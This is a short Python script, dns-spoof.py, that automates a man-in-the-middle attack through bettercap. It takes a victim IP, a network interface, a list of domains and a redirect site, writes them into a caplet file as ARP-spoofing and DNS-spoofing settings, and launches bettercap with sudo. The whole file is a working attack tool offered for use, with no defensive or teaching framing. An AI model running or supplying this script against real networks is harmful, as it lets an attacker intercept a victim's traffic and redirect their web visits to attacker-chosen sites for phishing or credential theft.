#!/usr/bin/env python3
from sys import argv as arg
from os import system

helpMenu = '''
python3 dns-spoof.py IP Interface DomainsFile WebsiteToRedirectTo

IP -> The IP Address to attack
Interface -> The interface to be used to perform the MITM attack
DomainsFile -> The file containing domains to spoof. Each domain should be on a new line
WebsiteToRedirectTo -> The website to redirect to, if the victim visits a domain in the file

DO NOT DELETE 'spoofDNS.cap'
'''

try:
      ip = arg[1]
      interface = arg[2]
      domains = arg[3]
      redirect = arg[4]

except:
      print(helpMenu)
      exit()

domainsList = ""
try:
      domainsFile = open(domains,'r')
except:
      print(f"{domains} was not found")
      exit()
allDomains = domainsFile.readlines()
for domain in allDomains:
      domain = domain.strip()
      domainsList += f"{domain},"
domainsList = domainsList.rstrip(',')

f = "spoofDNS.cap"
cmd = f"sudo bettercap -caplet {f} -iface {interface}"

spoofFile = open(f,'r')
lines = spoofFile.readlines()
lines[0] = f"set dns.spoof.address {redirect}\n"
lines[1] = f"set dns.spoof.domains {domainsList}\n"
lines[4] = f"set arp.spoof.targets {ip}\n"
spoofFile = open(f,'w')
spoofFile.writelines(lines)
spoofFile.close()
system(cmd)
exit()
